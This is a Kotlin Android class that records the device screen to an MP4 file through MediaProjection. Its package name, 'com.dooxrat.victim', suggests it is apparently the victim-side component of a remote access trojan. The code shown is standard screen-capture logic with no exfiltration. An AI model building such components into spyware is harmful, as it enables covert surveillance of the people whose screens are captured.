package com.dooxrat.victim

import android.content.Context
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Environment
import android.util.DisplayMetrics
import android.view.WindowManager
import java.io.File

class ScreenRecorder(private val context: Context) {

    private var mediaRecorder: MediaRecorder? = null
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var outputFile: File? = null

    fun startRecording(resultCode: Int, data: android.content.Intent): String? {
        try {
            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            windowManager.defaultDisplay.getMetrics(metrics)

            outputFile = File(
                context.getExternalFilesDir(Environment.DIRECTORY_MOVIES),
                "screen_${System.currentTimeMillis()}.mp4"
            )

            mediaRecorder = MediaRecorder().apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setOutputFile(outputFile!!.absolutePath)
                setVideoSize(metrics.widthPixels, metrics.heightPixels)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoEncodingBitRate(5000000)
                setVideoFrameRate(30)
                prepare()
            }

            val projectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(resultCode, data)

            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenRecorder",
                metrics.widthPixels, metrics.heightPixels, metrics.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mediaRecorder!!.surface, null, null
            )

            mediaRecorder?.start()
            return outputFile?.absolutePath
        } catch (e: Exception) {
            e.printStackTrace()
            return null
        }
    }

    fun stopRecording() {
        try {
            mediaRecorder?.stop()
            mediaRecorder?.release()
            virtualDisplay?.release()
            mediaProjection?.stop()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
